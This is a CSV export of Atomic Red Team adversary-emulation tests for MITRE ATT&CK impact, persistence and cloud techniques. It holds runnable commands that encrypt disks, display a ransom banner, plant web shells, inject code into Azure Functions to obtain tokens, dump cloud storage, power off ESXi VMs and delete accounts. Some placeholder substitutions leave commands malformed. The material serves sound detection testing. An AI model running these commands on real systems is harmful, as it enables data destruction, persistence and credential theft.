"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1486","C:\AtomicRedTeam\atomics\T1486\T1486.yaml","Data Encrypt Using DiskCryptor","command_prompt","""""%PROGRAMFILES%\dcrypt""\PathToAtomicsFolder\..\ExternalPayloads\""
",,"Write-Host Downloading DiskCryptor installer New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe"" -OutFile      ""PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"" Write-Host Install DiskCryptor Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"" -Wait -ArgumentList ""/s"" "
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Windows - Stop service using Service Controller","command_prompt","sc.exe stop spooler
","sc.exe start spooler >nul 2>&1
",""
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Windows - Stop service using net.exe","command_prompt","net.exe stop spooler
","net.exe start spooler >nul 2>&1
",""
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Windows - Stop service by killing process","command_prompt","taskkill.exe /f /im spoolsv.exe
",,""
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Linux - Stop service using systemctl","sh","sudo systemctl stop cron
","sudo systemctl start cron 2> /dev/null
",""
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Linux - Stop service by killing process using killall","sh","sudo killall -SIGTERM cron
","sudo systemctl start cron 2> /dev/null
",""
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Linux - Stop service by killing process using kill","sh","sudo kill -SIGTERM $(pgrep cron)
","sudo systemctl start cron 2> /dev/null
",""
"T1489","C:\AtomicRedTeam\atomics\T1489\T1489.yaml","Linux - Stop service by killing process using pkill","sh","sudo pkill -SIGTERM ^cron$
","sudo systemctl start cron 2> /dev/null
",""
"T1491.001","C:\AtomicRedTeam\atomics\T1491.001\T1491.001.yaml","Replace Desktop Wallpaper","powershell","$url = ""https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png""
$imgLocation = ""$env:TEMP\T1491.001-newWallpaper.png""
$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper
$orgWallpaper | Out-File -FilePath ""$env:TEMP\T1491.001-OrginalWallpaperLocation""
$updateWallpapercode = @' 
using System.Runtime.InteropServices; 
namespace Win32{

    public class Wallpaper{ 
        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
        }
    }
} 
'@
$wc = New-Object System.Net.WebClient  
try{  
    $wc.DownloadFile($url, $imgLocation)
    add-type $updateWallpapercode 
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
} 
catch [System.Net.WebException]{  
    Write-Host(""Cannot download $url"") 
    add-type $updateWallpapercode 
    [Win32.Wallpaper]::SetWallpaper($imgLocation)
} 
finally{    
    $wc.Dispose()  
}
","$updateWallpapercode = @' 
using System.Runtime.InteropServices; 
namespace Win32{

    public class Wallpaper{ 
        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
        }
    }
} 
'@
if (Test-Path -Path $env:TEMP\T1491.001-OrginalWallpaperLocation -PathType Leaf) {
     $orgImg = Get-Content -Path ""$env:TEMP\T1491.001-OrginalWallpaperLocation""
     add-type $updateWallpapercode 
     [Win32.Wallpaper]::SetWallpaper($orgImg)
}
Remove-Item ""$env:TEMP\T1491.001-OrginalWallpaperLocation"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\T1491.001-newWallpaper.png"" -ErrorAction Ignore
",""
"T1491.001","C:\AtomicRedTeam\atomics\T1491.001\T1491.001.yaml","Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message","powershell","$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = ""PYSA""
$newLegalNoticeText = ""Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org""
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      ","Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
",""
"T1491.001","C:\AtomicRedTeam\atomics\T1491.001\T1491.001.yaml","ESXi - Change Welcome Message on Direct Console User Interface (DCUI)","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" -batch ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh -l PathToAtomicsFolder\..\ExternalPayloads\ -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" ""esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1491.001","C:\AtomicRedTeam\atomics\T1491.001\T1491.001.yaml","Windows - Display a simulated ransom note via Notepad (non-destructive)","powershell","$notePath = Join-Path $env:TEMP ""ART-T1491-ransom-note.txt""
$pidPath  = Join-Path $env:TEMP ""ART-T1491-notepad.pid""

$Title = ""!!! READ_ME_NOW !!!""
$Body  = ""Your files are SAFE. This is a TEST note for detection validation
by bak3n3k0. No data has been encrypted. This simulation exercises
detections for:
  - notepad.exe launched with a ransom-themed text file
  - creation of a ransom-themed text file in %TEMP%
NON-DESTRUCTIVE Atomic Red Team test.
""

$header  = $Title + ""`r`n"" + ('=' * $Title.Length) + ""`r`n`r`n""
$content = $header + $Body

[System.IO.File]::WriteAllText($notePath, $content, [System.Text.Encoding]::UTF8)

$p = Start-Process notepad.exe -ArgumentList ""`""$notePath`"""" -PassThru
$p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force
","try {
  # 1. Kill all Notepad processes
  Get-Process notepad -ErrorAction SilentlyContinue |
    ForEach-Object {
      Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
    }

  # 2. Wait briefly for Windows to release file handles
  Start-Sleep -Seconds 1

  # 3. Force delete ransom note + PID file
  $notePath = Join-Path $env:TEMP ""ART-T1491-ransom-note.txt""
  $pidPath  = Join-Path $env:TEMP ""ART-T1491-notepad.pid""

  if (Test-Path $notePath) {
    Remove-Item $notePath -Force -ErrorAction Stop
  }
  if (Test-Path $pidPath) {
    Remove-Item $pidPath -Force -ErrorAction Stop
  }
}
catch {
  Write-Warning ""Cleanup failed with error: $_""
}
",""
"T1496","C:\AtomicRedTeam\atomics\T1496\T1496.yaml","Windows - Simulate CPU Load with PowerShell","powershell","$end = (Get-Date).AddSeconds(30)
1..4 | ForEach-Object { Start-Job { param($t) while((Get-Date) -lt $t) { $i=0; while($i -lt 200000){$i++} } } -ArgumentList $end }
Get-Job | Wait-Job | Remove-Job
",,""
"T1497.003","C:\AtomicRedTeam\atomics\T1497.003\T1497.003.yaml","Delay execution with ping","sh","ping -c 250 8.8.8.8 > /dev/null
whoami
",,""
"T1505.002","C:\AtomicRedTeam\atomics\T1505.002\T1505.002.yaml","Install MS Exchange Transport Agent Persistence","powershell","Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
Enable-TransportAgent Security Interop Agent
Get-TransportAgent | Format-List Name,Enabled
","if(Get-Command ""Get-TransportAgent"" -ErrorAction Ignore){
  Disable-TransportAgent Security Interop Agent
  Uninstall-TransportAgent Security Interop Agent
  Get-TransportAgent
}
","Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn "
"T1505.003","C:\AtomicRedTeam\atomics\T1505.003\T1505.003.yaml","Web Shell Written to Disk","command_prompt","xcopy /I /Y ""#{web_shells}"" #{web_shells}
","del #{web_shells}\b.jsp /q >nul 2>&1
del #{web_shells}\tests.jsp /q >nul 2>&1
del #{web_shells}\cmd.aspx /q >nul 2>&1
","New-Item -Type Directory ""#{web_shells}"" -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp"" -OutFile ""#{web_shells}/b.jsp"" Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"" -OutFile ""#{web_shells}/tests.jsp"" Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"" -OutFile ""#{web_shells}/cmd.aspx"" "
"T1505.004","C:\AtomicRedTeam\atomics\T1505.004\T1505.004.yaml","Install IIS Module using AppCmd.exe","command_prompt","%windir%\system32\inetsrv\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\system32\inetsrv\defdoc.dll
","%windir%\system32\inetsrv\appcmd.exe uninstall module DefaultDocumentModule_Atomic
","Install IIS to continue. "
"T1505.004","C:\AtomicRedTeam\atomics\T1505.004\T1505.004.yaml","Install IIS Module using PowerShell Cmdlet New-WebGlobalModule","powershell","New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\system32\inetsrv\defdoc.dll
","Remove-WebGlobalModule -Name DefaultDocumentModule_Atomic
","Install IIS to continue. "
"T1526","C:\AtomicRedTeam\atomics\T1526\T1526.yaml","Azure - Dump Subscription Data with MicroBurst","powershell","import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1""
$Password = ConvertTo-SecureString -String ""PathToAtomicsFolder\..\ExternalPayloads\"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""PathToAtomicsFolder\..\ExternalPayloads\"", $Password
Connect-AzAccount -Credential $Credential | out-null
Get-AzDomainInfo -folder PathToAtomicsFolder\..\ExternalPayloads\ -subscription ""PathToAtomicsFolder\..\ExternalPayloads\"" -verbose
","remove-item PathToAtomicsFolder\..\ExternalPayloads\ -recurse -force -erroraction silentlycontinue
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null invoke-webrequest ""https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1"" ; Install-Module -Name Az -Force "
"T1526","C:\AtomicRedTeam\atomics\T1526\T1526.yaml","AWS - Enumerate common cloud services","powershell","Import-Module ""PathToAtomicsFolder\T1526\src\AWSDiscovery.ps1""
$access_key = """"
$secret_key = """"
$session_token = """"
$aws_profile = """"
$regions = ""us-east-1,us-east-2,us-west-1,us-west-2""
Set-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile
Get-AWSDiscoveryData -Regions $regions -OutputDirectory ""$env:TMPDIR/aws_discovery""
Remove-BlankFiles -OutputDirectory ""$env:TMPDIR/aws_discovery""
",,"Install-Module -Name AWSPowerShell -Force "
"T1526","C:\AtomicRedTeam\atomics\T1526\T1526.yaml","Azure - Enumerate common cloud services","powershell","Import-Module ""PathToAtomicsFolder\T1526\src\AzureDiscovery.ps1""
$client_id = """"
$client_secret = """"
$tenant_id = """"
$environment = ""AzureCloud""
Set-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment
Get-AzureDiscoveryData -OutputDirectory ""$env:TMPDIR/azure_discovery"" -Environment $environment
Remove-BlankFiles -OutputDirectory ""$env:TMPDIR/azure_discovery""
",,"Install-Module -Name Az -Force "
"T1528","C:\AtomicRedTeam\atomics\T1528\T1528.yaml","Azure - Functions code upload - Functions code injection via Blob upload","powershell","az login    # Log in to Azure CLI

$allowSharedKeyAccess = az storage account show --name ""storage_account_name_example"" --query ""allowSharedKeyAccess""

if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
    Write-Output ""Shared key access is disabled for this storage account.""
} else {    
    $connectionString = az storage account show-connection-string --name ""storage_account_name_example"" --query connectionString --output tsv

    # Download blob for cleanup
    $tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1528_tmp_original_"" + ""blob_example"")
    az storage blob download --connection-string $connectionString --container-name ""container_name_example"" --name ""blob_example"" --file $tmpOriginalFunctionCode --overwrite true

    if ($LASTEXITCODE -eq 0) {
        # Upload new blob version if download of existing blob succeeded
        az storage blob upload --connection-string $connectionString --container-name ""container_name_example"" --name ""blob_example"" --file ""$env:temp/T1528_function_code.zip"" --overwrite true
    } else {
        Write-Output ""Download original function code failed.""
        exit 1
    }
}
","az login    # Log in to Azure CLI

# Upload previous funciton code
$tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1528_tmp_original_"" + ""blob_example"")
az storage blob upload --account-name ""storage_account_name_example"" --container-name ""container_name_example"" --file $tmpOriginalFunctionCode --name ""blob_example"" --overwrite true 2>$null

if ($LASTEXITCODE -eq 0) {
    Write-Output ""Uploaded original version of function code.""

    # Delete tmp original blob file if upload succeeded
    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue
    Write-Output ""Deleted tmp original blob file: $($tmpOriginalFunctionCode)""
} else {
    Write-Output ""Upload original function code failed.""
}","Install-Module -Name Az -Force"
"T1528","C:\AtomicRedTeam\atomics\T1528\T1528.yaml","Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token","powershell","az login    # Log in to Azure CLI

$allowSharedKeyAccess = az storage account show --name ""storage_account_name_example"" --query ""allowSharedKeyAccess""

if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
    Write-Output ""Shared key access is disabled for this storage account.""
} else {
    # Download file for cleanup
    $tmpOriginalFileName = [System.IO.Path]::GetFileName(""site/wwwroot/function_app.py"")
    $tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1528_tmp_original_"" + $tmpOriginalFileName)
    az storage file download --account-name ""storage_account_name_example"" --share-name ""file_share_name_example"" -p ""site/wwwroot/function_app.py"" --only-show-errors --dest $tmpOriginalFunctionCode

    if ($LASTEXITCODE -eq 0) {
        # Upload new funciton code if download of existing code succeeded
        if (""insert_code"" -eq ""insert_code"") {
            # Download file from file share for injection
            $tmpFunctionCode = Join-Path $env:temp/ (""T1528_tmp_to_inject_"" + $tmpOriginalFileName)
            az storage file download --account-name ""storage_account_name_example"" --share-name ""file_share_name_example"" -p ""site/wwwroot/function_app.py"" --only-show-errors --dest $tmpFunctionCode
            
            if ($LASTEXITCODE -ne 0) {
                Write-Output ""Function code download failed.""
                exit 1
            }
            Write-Output ""File downloaded: $($tmpFunctionCode)""
            
            $insertContent = Get-Content -Path ""$PathToAtomicsFolder/T1528/src/code_to_insert.py"" -Raw  # Load the content of the insert file
            
            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file
            $content = $insertContent + ""`n"" + $content     # Insert the new code at the beginning
            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file
            
            # Upload file to file share
            az storage file upload --account-name ""storage_account_name_example"" --share-name ""file_share_name_example"" -p ""site/wwwroot/function_app.py"" --source $tmpFunctionCode --only-show-errors
            if ($LASTEXITCODE -ne 0) {
                Write-Output ""Function code upload failed.""
                exit 1
            }
            Write-Output ""Uploaded the tampered file""
        } elseif (""insert_code"" -eq ""replace_file"") {
            az storage file upload --account-name ""storage_account_name_example"" --share-name ""file_share_name_example"" -p ""site/wwwroot/function_app.py"" --source ""$PathToAtomicsFolder/T1528/src/code_to_insert.py"" --only-show-errors
            if ($LASTEXITCODE -ne 0) {
                Write-Output ""Function code upload failed.""
                exit 1
            }
            Write-Output ""Uploaded the tampered file""
        } else {
            Write-Output ""Please choose a valid execution_option""
            exit 1
        }
    } else {
        Write-Output ""Download original function code failed.""
        exit 1
    }
}","az login    # Log in to Azure CLI

# Upload previous funciton code
$tmpOriginalFileName = [System.IO.Path]::GetFileName(""site/wwwroot/function_app.py"")
$tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1528_tmp_original_"" + $tmpOriginalFileName)
az storage file upload --account-name ""storage_account_name_example"" --share-name ""file_share_name_example"" -p ""site/wwwroot/function_app.py"" --source $tmpOriginalFunctionCode --only-show-errors 2>$null

if ($LASTEXITCODE -eq 0) {
    Write-Output ""Uploaded original version of function code.""

    # Delete tmp original f file if upload succeeded
    if (""insert_code"" -eq ""insert_code"") {
        $tmpFunctionCode = Join-Path $env:temp/ (""T1528_tmp_to_inject_"" + $tmpOriginalFileName)
        Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue
        Write-Output ""Deleted tmp file: $($tmpFunctionCode)""
    }

    # Delete tmp original file
    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue
    Write-Output ""Deleted tmp original file: $($tmpOriginalFunctionCode)""
} else {
    Write-Output ""Upload original function code failed.""
}","Install-Module -Name Az -Force"
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","Shutdown System - Windows","command_prompt","shutdown /s /t 1
",,""
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","Restart System - Windows","command_prompt","shutdown /r /t 1
",,""
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","Restart System via `shutdown` - FreeBSD/macOS/Linux","sh","shutdown -r now
",,""
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","Shutdown System via `shutdown` - FreeBSD/macOS/Linux","sh","shutdown -h now
",,""
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","ESXi - Terminates VMs using pkill","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh  -l ""PathToAtomicsFolder\..\ExternalPayloads\"" -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" -m ""PathToAtomicsFolder\..\ExternalPayloads\""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","ESXi - Avoslocker enumerates VMs and forcefully kills VMs","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh  -l ""PathToAtomicsFolder\..\ExternalPayloads\"" -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" -m ""PathToAtomicsFolder\..\ExternalPayloads\""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1529","C:\AtomicRedTeam\atomics\T1529\T1529.yaml","ESXi - vim-cmd Used to Power Off VMs","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" -batch ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh -l PathToAtomicsFolder\..\ExternalPayloads\ -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1530","C:\AtomicRedTeam\atomics\T1530\T1530.yaml","AWS - Scan for Anonymous Access to S3","sh","aws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2
","aws s3 rb s3://redatomic-test2 --force 
rm -rf /tmp/redatomic-test2
","echo Please install the aws-cli and configure your AWS default profile using: aws configure "
"T1530","C:\AtomicRedTeam\atomics\T1530\T1530.yaml","Azure - Dump Azure Storage Account Objects via Azure CLI","powershell","$storage_account_objects = Import-Csv -Path ""$env:temp\T1619_storage_account_objects.csv""

# Login to Azure
az login

if (-not (Test-Path -Path ""$env:temp\T1530_storage_account_objects"")) {
    New-Item -ItemType Directory -Path ""$env:temp\T1530_storage_account_objects""
}

foreach ($row in $storage_account_objects) {
    
    if ($row.FileShareName -ne """"){
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""

        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
            Write-Output ""Shared key access is disabled for this storage account.""
        } else {
            Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path $env:temp\T1530_storage_account_objects ""$($row.ResourceGroup)_$($row.StorageAccountName)""
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for file share content
            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName
            if (-not (Test-Path -Path $fileSharePath)) {
                New-Item -ItemType Directory -Path $fileSharePath
            }
            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath
        }
    } elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""

        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
            Write-Output ""Shared key access is disabled for this storage account.""
        } else {
            Write-Output ""Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...""
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path $env:temp\T1530_storage_account_objects ""$($row.ResourceGroup)_$($row.StorageAccountName)""
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for blob content
            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName
            if (-not (Test-Path -Path $containerFolderPath)) {
                New-Item -ItemType Directory -Path $containerFolderPath
            }
            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString
        }
    }
}","Remove-Item -Path ""$env:temp\T1530_storage_account_objects"" -Recurse -Force -erroraction silentlycontinue
Write-Output ""Removed $env:temp\T1530_storage_account_objects""","Install-Module -Name Az -Force"
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Change User Password - Windows","command_prompt","net user AtomicAdministrator User2ChangePW! /add
net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD
","net.exe user AtomicAdministrator /delete >nul 2>&1
",""
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Delete User - Windows","command_prompt","net user AtomicUser User2DeletePW! /add
net.exe user AtomicUser /delete
",,""
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Remove Account From Domain Admin Group","powershell","$PWord = ConvertTo-SecureString -String Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0, $PWord
if((Get-ADUser Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Properties memberof).memberof -like ""CN=Domain Admins*""){
  Remove-ADGroupMember -Identity ""Domain Admins"" -Members Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Credential $Credential -Confirm:$False
} else{
    write-host ""Error - Make sure Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 is in the domain admins group"" -foregroundcolor Red
}
",,"Add-WindowsCapability -Online -Name ""Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"" "
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Change User Password via passwd","sh","passwd ARTUser #enter admin password > enter new password > confirm new password
",,""
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Delete User via dscl utility","sh","dscl . -delete /Users/ARTUser #enter admin password
","dscl . -create /Users/ARTUser #enter admin password
dscl . -create /Users/ARTUser UserShell /bin/bash
dscl . -create /Users/ARTUser UniqueID 503
dscl . -create /Users/ARTUser NFSHomeDirectory /Users/ARTUser
dscl . -passwd /Users/ARTUser ARTPassword #enter password for new user
",""
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Delete User via sysadminctl utility","sh","sysadminctl -deleteUser ARTUserAccount #enter admin password
","sysadminctl -addUser ARTUserAccount -fullName ""ARTUser"" -password ARTPassword
",""
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Azure AD - Delete user via Azure AD PowerShell","powershell","Connect-AzureAD
$userprincipalname = ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""
Remove-AzureADUser -ObjectId $userprincipalname","N/A","echo ""use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force""; echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment"""
"T1531","C:\AtomicRedTeam\atomics\T1531\T1531.yaml","Azure AD - Delete user via Azure CLI","powershell","az login
$userprincipalname = ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""
az ad user delete --id $userprincipalname","N/A","echo ""use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows""; echo ""use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi""; echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment"""
